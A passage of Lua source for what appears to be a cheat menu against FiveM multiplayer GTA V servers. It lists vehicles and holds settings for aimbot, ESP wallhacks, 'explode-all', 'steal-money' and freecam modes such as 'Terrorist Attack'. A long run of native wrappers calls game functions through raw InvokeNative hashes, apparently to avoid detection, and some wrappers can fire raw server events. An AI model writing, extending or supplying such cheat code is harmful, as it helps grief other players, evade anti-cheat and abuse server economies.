       fuckingoffro = {'BFinjection', 'Bifta', 'Blazer', 'Blazer2', 'Blazer3', 'Blazer5', 'Bohdi', 'Brawler', 'Bruiser', 'Bruiser2', 'Bruiser3', 'Caracara', 'DLoader', 'Dune', 'Dune2', 'Dune3', 'Dune4', 'Dune5', 'Insurgent', 'Insurgent2', 'Insurgent3', 'Kalahari', 'Kamacho', 'LGuard', 'Marshall', 'Mesa', 'Mesa2', 'Mesa3', 'Monster', 'Monster4', 'Monster5', 'Nightshark', 'RancherXL', 'RancherXL2', 'Rebel', 'Rebel2', 'RCBandito', 'Riata', 'Sandking', 'Sandking2', 'Technical', 'Technical2', 'Technical3', 'TrophyTruck', 'TrophyTruck2', 'Freecrawler', 'Menacer'},
       fuckingplane = {'AlphaZ1', 'Avenger', 'Avenger2', 'Besra', 'Blimp', 'blimp2', 'Blimp3', 'Bombushka', 'Cargoplane', 'Cuban800', 'Dodo', 'Duster', 'Howard', 'Hydra', 'Jet', 'Lazer', 'Luxor', 'Luxor2', 'Mammatus', 'Microlight', 'Miljet', 'Mogul', 'Molotok', 'Nimbus', 'Nokota', 'Pyro', 'Rogue', 'Seabreeze', 'Shamal', 'Starling', 'Stunt', 'Titan', 'Tula', 'Velum', 'Velum2', 'Vestra', 'Volatol', 'Striekforce'},
       fuckingsuvs = {'BJXL', 'Baller', 'Baller2', 'Baller3', 'Baller4', 'Baller5', 'Baller6', 'Cavalcade', 'Cavalcade2', 'Dubsta', 'Dubsta2', 'Dubsta3', 'FQ2', 'Granger', 'Gresley', 'Habanero', 'Huntley', 'Landstalker', 'patriot', 'Patriot2', 'Radi', 'Rocoto', 'Seminole', 'Serrano', 'Toros', 'XLS', 'XLS2'},
       fuckingsedans = {'Asea', 'Asea2', 'Asterope', 'Cog55', 'Cogg552', 'Cognoscenti', 'Cognoscenti2', 'emperor', 'emperor2', 'emperor3', 'Fugitive', 'Glendale', 'ingot', 'intruder', 'limo2', 'premier', 'primo', 'primo2', 'regina', 'romero', 'stafford', 'Stanier', 'stratum', 'stretch', 'surge', 'tailgater', 'warrener', 'Washington'},
       fuckingservice = {'Airbus', 'Brickade', 'Bus', 'Coach', 'Rallytruck', 'Rentalbus', 'taxi', 'Tourbus', 'Trash', 'Trash2', 'WastIndr', 'PBus2'},
       fuckingsports = {'Alpha', 'Banshee', 'Banshee2', 'BestiaGTS', 'Buffalo', 'Buffalo2', 'Buffalo3', 'Carbonizzare', 'Comet2', 'Comet3', 'Comet4', 'Comet5', 'Coquette', 'Deveste', 'Elegy2', 'Feltzer2', 'Feltzer3', 'FlashGT', 'Furoregt', 'Fusilade', 'Futo', 'GB200', 'Hotring', 'Infernus2', 'Italigto', 'Jester', 'Jester2', 'Khamelion', 'Kurama', 'Kurama2', 'Lynx', 'MAssacro', 'MAssacro2', 'neon', 'Ninef', 'ninfe2', 'omnis', 'Pariah', 'Penumbra', 'Raiden', 'RapidGT', 'RapidGT2', 'Raptor', 'Revolter', 'Ruston', 'Schafter2', 'Schafter3', 'Schafter4', 'Schafter5', 'Schafter6', 'Schlagen', 'Schwarzer', 'Sentinel3', 'Seven70', 'Specter', 'Specter2', 'Streiter', 'Sultan', 'Surano', 'Tampa2', 'Tropos', 'Verlierer2', 'ZR380'},
       fuckingsporclas = {'Ardent', 'BType', 'BType2', 'BType3', 'Casco', 'Cheetah2', 'Cheburek', 'Coquette2', 'Coquette3', 'Deluxo', 'Fagaloa', 'Gt500', 'JB700', 'Jester3', 'MAmba', 'Manana', 'Michelli', 'Monroe', 'Peyote', 'Pigalle', 'RapidGT3', 'Retinue', 'Savestra', 'Stinger', 'Stingergt', 'Stromberg', 'Swinger', 'Torero', 'Tornado', 'Tornado2', 'Tornado3', 'Tornado4', 'Tornado5', 'Tornado6', 'Viseris', 'Z190', 'ZType'},
       fuckingsuper = {'Adder', 'Autarch', 'Bullet', 'Cheetah', 'Cyclone', 'Elegy', 'EntityXF', 'Entity2', 'FMJ', 'GP1', 'Infernus', 'LE7B', 'Nero', 'Nero2', 'Osiris', 'Penetrator', 'PFister811', 'Prototipo', 'Reaper', 'SC1', 'Scramjet', 'Sheava', 'SultanRS', 'Superd', 'T20', 'Taipan', 'Tempesta', 'Tezeract', 'Turismo2', 'Turismor', 'Tyrant', 'Tyrus', 'Vacca', 'Vagner', 'Vigilante', 'Visione', 'Voltic', 'Voltic2', 'Zentorno', 'Italigtb', 'Italigtb2', 'XA21'},
       fuckingtrailer = {'ArmyTanker', 'ArmyTrailer', 'ArmyTrailer2', 'BaleTrailer', 'BoatTrailer', 'CableCar', 'DockTrailer', 'Graintrailer', 'Proptrailer', 'Raketailer', 'TR2', 'TR3', 'TR4', 'TRFlat', 'TVTrailer', 'Tanker', 'Tanker2', 'Trailerlogs', 'Trailersmall', 'Trailers', 'Trailers2', 'Trailers3'},
       fuckingtrains = {'Freight', 'Freightcar', 'Freightcont1', 'Freightcont2', 'Freightgrain', 'Freighttrailer', 'TankerCar'},
       fuckingworking = {'Airtug', 'Caddy', 'Caddy2', 'Caddy3', 'Docktug', 'Forklift', 'Mower', 'Ripley', 'Sadler', 'Scrap', 'TowTruck', 'Towtruck2', 'Tractor', 'Tractor2', 'Tractor3', 'TrailerLArge2', 'Utilitruck', 'Utilitruck3', 'Utilitruck2'},
       fuckingvans = {'Bison', 'Bison2', 'Bison3', 'BobcatXL', 'Boxville', 'Boxville2', 'Boxville3', 'Boxville4', 'Boxville5', 'Burrito', 'Burrito2', 'Burrito3', 'Burrito4', 'Burrito5', 'Camper', 'GBurrito', 'GBurrito2', 'Journey', 'Minivan', 'Minivan2', 'Paradise', 'pony', 'Pony2', 'Rumpo', 'Rumpo2', 'Rumpo3', 'Speedo', 'Speedo2', 'Speedo4', 'Surfer', 'Surfer2', 'Taco', 'Youga', 'youga2'},
       
   
   
       freecam = { 
           freezer = false,
           mode = 1,
           modes = {
               "Teleport",
               "Fast and Furious",
               "Vehicle Spawner",
               "Entity Deleter",
               "Particle Spawner",
               "Ped Spawner",
               "Animal Spawner",
               "Prop Spawner",
               "Map Fucker",
               "Tree Spawner",
               "Look Around",
               "Freeze Entity",
               "Terrorist Attack",
               "Dog Attack",
               "Shockwave Gun",
           },
       },
       menu = true,
       st = {
           ['player'] = {static = 0.0, static2 = 0.0},
           ['vehicle'] = {static = 0.0, static2 = 0.0},
           ['weapons'] = {static = 0.0, static2 = 0.0},
           ['visuals'] = {static = 0.0, static2 = 0.0},
           ['destroyer'] = {static = 0.0, static2 = 0.0},
           ['players'] = {static = 0.0, static2 = 0.0},
           ['settings'] = {static = 0.0, static2 = 0.0},
           ['lua'] = {static = 0.0, static2 = 0.0},
           ['glife'] = {static = 0.0, static2 = 0.0, static3 = 0.0},
           ['aimbot'] = {static = 0.0, static2 = 0.0},
       },
       c = {
           ['settings-MainFade'] = true, 
           ['settings-Fade'] = true,
       }, 
       curak = {
           abs = math.abs,
           atan2 = math.atan2,
           ceil = math.ceil,
           cos = math.cos,
           deg = math.deg,
           pi = math.pi,
           rad = math.rad,
           random = math.random,
           sin = math.sin,
           sqrt = math.sqrt,
           floor = math.floor,  
           clamp = math.clamp,
           vector3 = vector3,
           pairs = pairs,
           ipairs = ipairs,
           tostring = tostring, 
           tonumber = tonumber,
           format = string.format,
           upper = string.upper,
           len = string.len,
           lower = string.lower,
           sub = string.sub,
           find = string.find,
           gsub = string.gsub,
           print = print,
           gmatch = string.gmatch,
           wait = ci_.Wait,
           thr = ci_.CreateThread,
           inv = ci_.InvokeNative,
           rra = ci_.ReturnResultAnyway,
           int = ci_.PointerValueInt,
           pvv = ci_.PointerValueVector,
           raf = ci_.ResultAsFloat,
           ras = ci_.ResultAsString,
           ral = ci_.ResultAsLong,
           rav = ci_.ResultAsVector,
           rai = ci_.ResultAsInteger,
           sudp = ci_.Trace,
           pvf = ci_.PointerValueFloat,
           rao = ci_.ResultAsObject,
           ii = ci_.PointerValueIntInitialized,
           pvi = ci_.PointerValueInt,
       },
       s = {
           ['player-smart-health'] = {max = 100, min = 0, value = 100},
           ['player-smart-health-time'] = {max = 15000, min = 0, value = 2500},
           ['player-smart-armor'] = {max = 100, min = 0, value = 100},
           ['player-smart-armor-time'] = {max = 15000, min = 0, value = 2500},
           ['player-superrun'] = {max = 10.0, min = 0.0, value = 1.0},
           ['player-superrun-slide'] = {max = 50.0, min = 0.0, value = 5.0},
           ['player-superjump'] = {max = 50.0, min = 0.0, value = 6.0},
           ['player-freecam-fov'] = {max = 130.0, min = 0.0, value = 50.0}, 
           ['self-gameplay-fov'] = {max = 130.0, min = 0.0, value = 50.0},
           ['player-freecam-sensitivity'] = {max = 15.0, min = 0.0, value = 8.0},
           ['player-freecam-speed'] = {max = 2.0, min = 0.0, value = 0.5},
           ['vehicle-color-r'] = {value = 255, max = 255, min = 0},
           ['vehicle-color-g'] = {value = 255, max = 255, min = 0},
           ['vehicle-color-b'] = {value = 255, max = 255, min = 0},
           ['npcvehicle-color-r'] = {value = 255, max = 255, min = 0},
           ['npcvehicle-color-g'] = {value = 255, max = 255, min = 0},
           ['npcvehicle-color-b'] = {value = 255, max = 255, min = 0},
           ['explode-all-button'] = {value = 7, max = 72, min = 0},
           ['explode-all-loop'] = {value = 7, max = 72, min = 0},
           ['player-noclip-value'] = {value = 1.0, max = 100.0, min = 0},
           ['glife-noclip-value'] = {value = 10.0, max = 100.0, min = 0},
           ['glife-prop-value'] = {value = 200, max = 255, min = 0},
           ['exglife-noclip-value'] = {value = 0.8, max = 100.0, min = 0},
   
           ['combo-arrow-r'] = {value = 255, max = 255, min = 0},
           ['combo-arrow-g'] = {value = 0, max = 255, min = 0},
           ['combo-arrow-b'] = {value = 0, max = 255, min = 0},
   
           ['steal-money'] = {value = 100, max = 100000, min = 0},
   
   
           ['visuals-bounding-r'] = {value = 255, max = 255, min = 0},
           ['visuals-bounding-g'] = {value = 255, max = 255, min = 0},
           ['visuals-bounding-b'] = {value = 255, max = 255, min = 0},   
   
           ['magneto-r'] = {value = 255, max = 255, min = 0},
           ['magneto-g'] = {value = 255, max = 255, min = 0},
           ['magneto-b'] = {value = 255, max = 255, min = 0},   
           
           ['magneto-power'] = {value = 0.5, max = 500.0, min = 0},
   
           ['visuals-vehicle-r'] = {value = 255, max = 255, min = 0},
           ['visuals-vehicle-g'] = {value = 255, max = 255, min = 0},
           ['visuals-vehicle-b'] = {value = 255, max = 255, min = 0},   
   
           ['menu-r'] = {value = 255, max = 255, min = 0},
           ['menu-g'] = {value = 0, max = 255, min = 0},
           ['menu-b'] = {value = 0, max = 255, min = 0},
   
           ['waypoint-r'] = {value = 164, max = 255, min = 0},
           ['waypoint-g'] = {value = 76, max = 255, min = 0},
           ['waypoint-b'] = {value = 242, max = 255, min = 0},
   
               
           ['checkbox-r'] = {value = 255, max = 255, min = 0},
           ['checkbox-g'] = {value = 0, max = 255, min = 0},
           ['checkbox-b'] = {value = 0, max = 255, min = 0},
   
           ['neon-color-r'] = {value = 255, max = 255, min = 0},
           ['neon-color-g'] = {value = 255, max = 255, min = 0},
           ['neon-color-b'] = {value = 255, max = 255, min = 0},
   
           ['neonnpc-color-r'] = {value = 255, max = 255, min = 0},
           ['neonnpc-color-g'] = {value = 255, max = 255, min = 0},
           ['neonnpc-color-b'] = {value = 255, max = 255, min = 0},
   
               
           ['checkbox-check-r'] = {value = 0, max = 255, min = 0},
           ['checkbox-check-g'] = {value = 255, max = 255, min = 0},
           ['checkbox-check-b'] = {value = 0, max = 255, min = 0},
   
           ['visuals-bounding-vis-r'] = {value = 255, max = 255, min = 0},
           ['visuals-bounding-vis-g'] = {value = 0, max = 255, min = 0},
           ['visuals-bounding-vis-b'] = {value = 0, max = 255, min = 0},
           ['visuals-bounding-alpha'] = {value = 100, max = 150, min = 0},
   
           ['visuals-corner-r'] = {value = 255, max = 255, min = 0},
           ['visuals-corner-g'] = {value = 255, max = 255, min = 0},
           ['visuals-corner-b'] = {value = 255, max = 255, min = 0},
   
           ['crosshair-gap'] = {value = 4, min = 0, max = 100},
           ['crosshair-size'] = {value = 4, min = 0, max = 150},
           ['crosshair-thickness'] = {value = 1, min = 0, max = 15},
           ['crosshair-r'] = {max = 255, min = 0, value = 0},
           ['crosshair-g'] = {max = 255, min = 0, value = 255},
           ['crosshair-b'] = {max = 255, min = 0, value = 0},
   
           ['visuals-corner-vis-r'] = {value = 255, max = 255, min = 0},
           ['visuals-corner-vis-g'] = {value = 0, max = 255, min = 0},
           ['visuals-corner-vis-b'] = {value = 0, max = 255, min = 0},
   
           ['visuals-corner-alpha'] = {value = 100, max = 150, min = 0},
           ['magneto-marker'] = {value = 42, max = 43, min = 0},
           ['visuals-health-r'] = {value = 20, max = 255, min = 0},
           ['visuals-health-g'] = {value = 255, max = 255, min = 0},
           ['visuals-health-b'] = {value = 1, max = 255, min = 0},
   
           ['visuals-nametags-r'] = {max = 255, min = 0, value = 255},
           ['visuals-nametags-g'] = {max = 255, min = 0, value = 255},
           ['visuals-nametags-b'] = {max = 255, min = 0, value = 255},
   
           ['visuals-holdingweapons-r'] = {max = 255, min = 0, value = 255},
           ['visuals-holdingweapons-g'] = {max = 255, min = 0, value = 255},
           ['visuals-holdingweapons-b'] = {max = 255, min = 0, value = 255},
   
           ['visuals-armor-r'] = {value = 1, max = 255, min = 0},
           ['visuals-armor-g'] = {value = 122, max = 255, min = 0},
           ['visuals-armor-b'] = {value = 255, max = 255, min = 0},
   
           ['visuals-skeletons-r'] = {value = 255, max = 255, min = 0},
           ['visuals-skeletons-g'] = {value = 255, max = 255, min = 0},
           ['visuals-skeletons-b'] = {value = 255, max = 255, min = 0},
   
           ['visuals-skeletons-vis-r'] = {value = 255, max = 255, min = 0},
           ['visuals-skeletons-vis-g'] = {value = 0, max = 255, min = 0},
           ['visuals-skeletons-vis-b'] = {value = 0, max = 255, min = 0},
   
           ['visuals-world-r'] = {max = 255, min = 0, value = math.random(1, 255)},
           ['visuals-world-g'] = {max = 255, min = 0, value = math.random(1, 255)},
           ['visuals-world-b'] = {max = 255, min = 0, value = math.random(1, 255)},
   
           ['player-freecam-terrorist'] = {value = 2500, max = 10000, min = 0},
           ['player-health'] = {value = 100, max = 100, min = 0},
           ['player-health-custom'] = {value = 1000, max = 10000, min = 0},
           ['player-armor'] = {value = 100, max = 100, min = 0},
   
           ['visuals-distance'] = {value = 150, max = 2000, min = 0},
           
           ['weapons-aimlock-fov'] = {max = 1.5, min = 0.0, value = 0.07},
           ['weapons-aimbot-fov'] = {max = 1.5, min = 0.0, value = 0.075},
           ['glife-aimbot-fov'] = {max = 1.5, min = 0.0, value = 0.13},
           ['weapons-aimlock-smooth'] = {max = 1.00, min = 0, value = 0.22},
   
           ['clown-scale'] = {max = 100.0, min = 0, value = 50.0},
           ['flame-scale'] = {max = 100.0, min = 0, value = 50.0},
           ['muz-scale'] = {max = 200.0, min = 0, value = 1.0},
   
           ['lootbag-color-r'] = {value = 255, max = 255, min = 0},
           ['lootbag-color-g'] = {value = 0, max = 255, min = 0},
           ['lootbag-color-b'] = {value = 0, max = 255, min = 0},
           ['dungeon-color-r'] = {value = 0, max = 255, min = 0},
           ['dungeon-color-g'] = {value = 0, max = 255, min = 0},
           ['dungeon-color-b'] = {value = 255, max = 255, min = 0},
   
           ['visuals-lines-r'] = {value = 255, max = 255, min = 0},
           ['visuals-lines-g'] = {value = 255, max = 255, min = 0},
           ['visuals-lines-b'] = {value = 255, max = 255, min = 0},
           ['visuals-lines-vis-r'] = {value = 255, max = 255, min = 0},
           ['visuals-lines-vis-g'] = {value = 0, max = 255, min = 0},
           ['visuals-lines-vis-b'] = {value = 0, max = 255, min = 0},
   
           ['glife-xpfarm-distance'] = {value = 30, max = 400, min = 0},
           ['glife-extra-handling-attachment'] = {value = 30.0, max = 400.0, min = 0},
   
   
           ['visuals-glow-r'] = {value = 255, max = 255, min = 0},
           ['visuals-glow-g'] = {value = 0, max = 255, min = 0},
           ['visuals-glow-b'] = {value = 0, max = 255, min = 0},
   
           ['fill-ammo'] = {value = 250, max = 255, min = 0},
           ['extra-handling-attachment-npc'] = {value = 10.0, max = 200.0, min = 0},  
           ['extra-handling-attachment'] = {value = 10.0, max = 200.0, min = 0},  
           ['engine-boost'] = {value = 10.0, max = 200.0, min = 0},  
   
   
           ['freecam-particle-scale'] = {value = 10.0, max = 200.0, min = 0},  
           ['destroyer-particles'] = {value = 10.0, max = 200.0, min = 0},
           ['multiplier-value'] = {value = 1.0, max = 200.0, min = 0},
   
           ['hat'] = {value = 0, max = GetNumberOfPedDrawableVariations(PlayerPedId(), 0), min = 0},
           ['glasses'] = {value = 1, max = GetNumberOfPedPropDrawableVariations(PlayerPedId(), 1), min = 0},
           ['mask'] = {value = 1, max = GetNumberOfPedDrawableVariations(PlayerPedId(), 1), min = 0},
           ['hair'] = {value = 1, max = GetNumberOfPedDrawableVariations(PlayerPedId(), 2), min = 0},
           ['torso'] = {value = 1, max = GetNumberOfPedDrawableVariations(PlayerPedId(), 3), min = 0},
           ['legs'] = {value = 1, max = GetNumberOfPedDrawableVariations(PlayerPedId(), 4), min = 0},
           ['accesory'] = {value = 1, max = GetNumberOfPedDrawableVariations(PlayerPedId(), 5), min = 0},
           ['shoes'] = {value = 1, max = GetNumberOfPedDrawableVariations(PlayerPedId(), 6), min = 0},
           ['undershirt'] = {value = 1, max = GetNumberOfPedDrawableVariations(PlayerPedId(), 8), min = 0},
           ['shirt'] = {value = 1, max = GetNumberOfPedDrawableVariations(PlayerPedId(), 11), min = 0},
   
   
       },
       f = {
           drag = {
               ['Input'] = {X = 0.5, Y = 0.5, toggle = true},
               ['Menu'] = {X = 0.5, Y = 0.5, W = 0.5, H = 0.5, toggle = true},
           },
           tab = 'player',
           ['options'] = 0,
       },
   }
   
   
   
   sum.f.PlayerId = function()
       return sum.curak.inv(0x4F8644AF03D0E0D6)
   end
   
   sum.f.PlayerPedId = function()
       return sum.curak.inv(0xD80958FC74E988A6, sum.curak.rra(), sum.curak.rai())
   end
   
   local sel = {selectedPlayer = sum.f.PlayerId()}
   
   sum.f.enumerate = function(aH, aI, aJ)
       return coroutine.wrap(function() local aK, t = aH() if not t or t == 0 then aJ(aK)return end local aF = {handle = aK, destructor = aJ}
       setmetatable(aF, aE) local aL = true repeat coroutine.yield(t) aL, t = aI(aK) until not aL aF.destructor, aF.handle = nil, nil aJ(aK) end)
   end
   sum.f.enumerateVehicles = function()
       return sum.f.enumerate(FindFirstVehicle,FindNextVehicle,EndFindVehicle)
   end
   sum.f.enumeratePeds = function()
       return sum.f.enumerate(FindFirstPed,FindNextPed,EndFindPed)
   end
   sum.f.enumerateObjects = function()
       return sum.f.enumerate(FindFirstObject,FindNextObject,EndFindObject)
   end
   sum.f.IsDisabledControlJustReleased = function(a, b)
       return sum.curak.inv(0x305C8DCD79DA8B0F, a, b, sum.curak.rra())
   end
   sum.f.SetMouseCursorActiveThisFrame = function()
       return sum.curak.inv(0xAAE7CE1D63167423)
   end
   sum.f.DisableAllControlActions = function(a)
       return sum.curak.inv(0x5F4B6931816E599B, a)
   end
   sum.f.GetActiveScreenResolution = function()
       return sum.curak.inv(0x873C9F3104101DD3, sum.curak.int(), sum.curak.int())
   end
   sum.f.GetNuiCursorPosition = function()
       return sum.curak.inv(0xbdba226f, sum.curak.int(), sum.curak.int())
   end
   sum.f.SetTextFont = function(font)
       return sum.curak.inv(0x66E0276CC5F6B9DA, font)
   end
   sum.f.SetTextScale = function(scale, scale1)
       return sum.curak.inv(0x07C837F9A01C34C9, scale, scale1)
   end
   sum.f.SetTextCentre = function(align)
       return sum.curak.inv(0xC02F4DBFB51D988B, align)
   end
   sum.f.GetNumberOfPedPropDrawableVariations = function(ped, propId)
       return sum.curak.inv(0x5FAF9754E789FB47, ped, propId, sum.curak.rai())
   end
   sum.f.GetNumberOfPedDrawableVariations = function(ped, componentId)
       return sum.curak.inv(0x27561561732A7842, ped, componentId, sum.curak.rai())
   end
   sum.f.SetTextColour = function(r, g, b, a)
       return sum.curak.inv(0xBE6B23FFA53FB442, r, g, b, a)
   end
   sum.f.BeginTextCommandDisplayText = function(text)
       return sum.curak.inv(0x25FBB336DF1804CB, sum.curak.tostring(text))
   end
   sum.f.AddTextComponentSubstringPlayerName = function(text)
       return sum.curak.inv(0x6C188BE134E074AA, sum.curak.tostring(text))  
   end
   sum.f.EndTextCommandDisplayText = function(x, y)
       return sum.curak.inv(0xCD015E5BB0D96A57, x, y)
   end
   sum.f.IsDisabledControlPressed = function(a, b)
       return sum.curak.inv(0xE2587F8CBBD87B1D, a, b, sum.curak.rra())
   end
   sum.f.SetMouseCursorSprite = function(a)
       return sum.curak.inv(0x8DB8CFFD58B62552, a)
   end
   sum.f.PlaySoundFrontend = function(soundId, audioName, audioRef, p3)
       return sum.curak.inv(0x67C540AA08E4A6F5, soundId, sum.curak.tostring(audioName), sum.curak.tostring(audioRef), p3)
   end
   sum.f.BeginTextCommandWidth = function(text)
       return sum.curak.inv(0x54CE8AC98E120CAB, sum.curak.tostring(text))
   end
   sum.f.EndTextCommandGetWidth = function(font)
       return sum.curak.inv(0x85F061DA64ED2F67, font, sum.curak.raf())
   end
   sum.f.HasStreamedTextureDictLoaded = function(dict)
       return sum.curak.inv(0x0145F696AAAAD2E4, sum.curak.tostring(dict), sum.curak.rra())
   end
   sum.f.RequestStreamedTextureDict = function(dict)
       return sum.curak.inv(0xDFA2EF8E04127DD5, sum.curak.tostring(dict))
   end
   sum.f.DrawSprite = function(dict, name, x, y, w, h, heading, r, g, b, a)
       return sum.curak.inv(0xE7FFAE5EBF23D890, sum.curak.tostring(dict), sum.curak.tostring(name), x, y, w, h, heading, r, g, b, a)
   end
   sum.f.GetDuiHandle = function(duiObject)
       return sum.curak.inv(0x1655d41d, duiObject, sum.curak.rra(), sum.curak.ras())
   end
   sum.f.CreateRuntimeTextureFromDuiHandle = function(txd, txn, duiHandle)
       return sum.curak.inv(0xb135472b, txd, txn, sum.curak.tostring(duiHandle), sum.curak.rra(), sum.curak.ral())
   end
   sum.f.CreateRuntimeTxd = function(name)
       return sum.curak.inv(0x1f3ac778, sum.curak.tostring(name), sum.curak.rra(), sum.curak.ral())
   end
   sum.f.CreateDui = function(url, width, height)
       return sum.curak.inv(0x23eaf899, sum.curak.tostring(url), width, height, sum.curak.rra(), sum.curak.ral())
   end
   sum.f.SetEntityHealth = function(entity,health)
       return sum.curak.inv(0x6B76DC1F3AE6E6A3, entity, health)
   end
   sum.f.TriggerServerEventInternal = function(eventName, eventPayload, payloadlength)
       return sum.curak.inv(0x7FDD1128, sum.curak.tostring(eventName), sum.curak.tostring(eventPayload), payloadlength)
   end
   sum.f.TriggerEventInternal = function(eventName, eventPayload, payloadlength)
       return sum.curak.inv(0x91310870, sum.curak.tostring(eventName), sum.curak.tostring(eventPayload), payloadlength)
   end
   sum.f.StopScreenEffect = function(effectName)
       return sum.curak.inv(0x068E835A1D0DC0E3, sum.curak.tostring(effectName))
   end
   sum.f.ClearPedBloodDamage = function(ped)
       return sum.curak.inv(0x8FE22675A5A45817, ped)
   end
   sum.f.ClearPedWetness = function(ped)
       return sum.curak.inv(0x9C720776DAA43E7E, ped)
   end
   sum.f.ClearPedEnvDirt = function(ped)
       return sum.curak.inv(0x6585D955A68452A5, ped)
   end
   sum.f.LeaderboardsClearCacheData = function()
       return sum.curak.inv(0xD4B02A6B476E1FDC)
   end
   sum.f.LeaderboardsReadClearAll = function()
       return sum.curak.inv(0xA34CB6E6F0DF4A0B)
   end
   sum.f.ClearAllBrokenGlass = function()
       return sum.curak.inv(0xB32209EFFDC04913)
   end
   sum.f.ClearAllHelpMessages = function()
       return sum.curak.inv(0x6178F68A87A4D3A0)
   end
   sum.f.ClearBrief = function()
       return sum.curak.inv(0x9D292F73ADBD9313)
   end
   sum.f.ClearGpsFlags = function()
       return sum.curak.inv(0x21986729D6A3A830)
   end
   sum.f.ClearPrints = function()
       return sum.curak.inv(0xCC33FA791322B9D9)
   end
   sum.f.ClearSmallPrints = function()
       return sum.curak.inv(0x2CEA2839313C09AC)
   end
   sum.f.ClearReplayStats = function()
       return sum.curak.inv(0x1B1AB132A16FDA55)
   end
   sum.f.ClearFocus = function()
       return sum.curak.inv(0x31B73D1EA9F01DA2)
   end
   sum.f.ClearHdArea = function()
       return sum.curak.inv(0xCE58B1CFB9290813)
   end
   sum.f.ClearRelationshipBetweenGroups = function(realationship, group1, group2)
       return sum.curak.inv(0x5E29243FB56FC6D4, realationship, group1, group2, sum.curak.rai())
   end
   sum.f.ClearRagdollBlockingFlags = function(ped, flags)
       return sum.curak.inv(0xD86D101FCFD00A4B, ped, flags, sum.curak.rai())
   end
   sum.f.ClearFacialClipsetOverride = function(ped)
       return sum.curak.inv(0x637822DC2AFEEBF8, ped)
   end
   sum.f.ClearFacialIdleAnimOverride = function(ped)
       return sum.curak.inv(0x726256CC1EEB182F, ped)
   end
   sum.f.ClearAllPedVehicleForcedSeatUsage = function(ped)
       return sum.curak.inv(0xE6CA85E7259CE16B, ped)
   end
   sum.f.ClearPedDriveByClipsetOverride = function(ped)
       return sum.curak.inv(0x4AFE3690D7E0B5AC, ped)
   end
   sum.f.ClearAllPedProps = function(ped)
       return sum.curak.inv(0xCD8A7537A9B52F06, ped)
   end
   sum.f.ClearPedAlternateWalkAnim = function(ped, p1)
       return sum.curak.inv(0x8844BBFCE30AA9E9, ped, p1)
   end
   sum.f.ClearPedDecorations = function(ped)
       return sum.curak.inv(0x0E5173C163976E38, ped)
   end
   sum.f.ResetPedVisibleDamage = function(ped)
       return sum.curak.inv(0x3AC1F7B898F30C05, ped)
   end
   sum.f.GetEntityCoords = function(entity, alive)
       return sum.curak.inv(0x3FEF770D40960D5A, entity, alive, sum.curak.rra(), sum.curak.rav())
   end
   sum.f.GetPlayerPed = function(id)
       return sum.curak.inv(0x43A66C31C68491C0, id, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.NetworkResurrectLocalPlayer = function(p0, p1, p2, p3, p4, p5)
       return sum.curak.inv(0xEA23C49EAA83ACFB, p0, p1, p2, p3, p4, p5)
   end
   sum.f.SetEntityCoordsNoOffset = function(entity, X, Y, Z, p4, p5, p6)
       return sum.curak.inv(0x239A3351AC1DA385, entity, X, Y, Z, p4, p5, p6)
   end
   sum.f.AddArmourToPed = function(ped, amount)
       return sum.curak.inv(0x5BA652A0CD14DF2F, ped, amount)
   end
   sum.f.SetPlayerInvincible = function(ped, toggle)
       return sum.curak.inv(0x239528EACDC3E7DE, ped, toggle)
   end
   sum.f.SetEntityInvincible = function(ped, toggle)
       return sum.curak.inv(0x3882114BDE571AD4, ped, toggle)
   end
   sum.f.TaskJump = function(ped, unused)
       return sum.curak.inv(0x0AE4086104E067B1, ped, unused)
   end
   sum.f.SetEntityVisible = function(p0, p1, p2)
       return sum.curak.inv(0xEA1C610A04DB6BBB, p0, p1, p2)
   end
   sum.f.SetRunSprintMultiplierForPlayer = function(player, multiplier)
       return sum.curak.inv(0x6DB47AA77FD94E09, player, multiplier)
   end
   sum.f.SetPedMoveRateOverride = function(ped, value)
       return sum.curak.inv(0x085BF80FA50A39D1, ped, value)
   end
   sum.f.ResetPlayerStamina = function(player)
       return sum.curak.inv(0xA6F312FCCE9C1DFE, player)
   end
   sum.f.SetSuperJumpThisFrame = function(player)
       return sum.curak.inv(0x57FFF03E423A4C0B, player, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.PlayerId = function()
       return sum.curak.inv(0x4F8644AF03D0E0D6, sum.curak.rra(), sum.curak.rai())
   end
   sum.f.RequestModel = function(model)
       return sum.curak.inv(0x963D27A58DF860AC, model)
   end
   sum.f.HasModelLoaded = function(model)
       return sum.curak.inv(0x98A4EB5D89A0C952, model, sum.curak.rra())
   end
   sum.f.SetPlayerModel = function(player, model)
       return sum.curak.inv(0x00A1CADD00108836, player, model)
   end
   sum.f.ClonePedToTarget = function(player, targetPed)
       return sum.curak.inv(0xE952D6431689AD9A, player, targetPed)
   end
   sum.f.SetModelAsNoLongerNeeded = function(model)
       return sum.curak.inv(0xE532F5D78798DAAB, model)
   end
   sum.f.SetPedHeadBlendData = function(ped, shapeFirstID, shapeSecondID, shapeThirdID, skinFirstID, skinSecondID, skinThirdID, shapeMix, skinMix, thirdMix, isParent)
       return sum.curak.inv(0x9414E18B9434C2FE, ped, shapeFirstID, shapeSecondID, shapeThirdID, skinFirstID, skinSecondID, skinThirdID, shapeMix, skinMix, thirdMix, isParent)
   end
   sum.f.SetPedHeadOverlay = function(ped, overlayID, index, opacity)
       return sum.curak.inv(0x48F44967FA05CC1E, ped, overlayID, index, opacity)
   end
   sum.f.SetEntityDynamic = function(entity, toggle)
       return sum.curak.inv(0x1718DE8E3F2823CA, entity, toggle)
   end
   sum.f.SetMaxHealthHudDisplay = function(maximumValue)
       return sum.curak.inv(0x1718DE8E3F2823CA, maximumValue, sum.curak.rai())
   end
   sum.f.SetPedHeadOverlayColor = function(ped, overlayID, colorType, colorID, secondColorID)
       return sum.curak.inv(0x497BF74A7B9CB952, ped, overlayID, colorType, colorID, secondColorID)
   end
   sum.f.SetPedComponentVariation = function(ped, componentId, drawableId, textureId, paletteId)
       return sum.curak.inv(0x262B14F48D29DE80, ped, componentId, drawableId, textureId, paletteId)
   end
   sum.f.IsEntityAVehicle = function(entity)
       return sum.curak.inv(0x6AC7003FA6E5575E, entity)
   end
   sum.f.SetPedHairColor = function(ped, colorID, highlightColorID)
       return sum.curak.inv(0x4CFFC65454C93A49, ped, colorID, highlightColorID)
   end
   sum.f.SetPedPropIndex = function(ped, componentId, drawableId, textureId, attach)
       return sum.curak.inv(0x93376B65A266EB5F, ped, componentId, drawableId, textureId, attach)
   end
   sum.f.SetPedDefaultComponentVariation = function(ped)
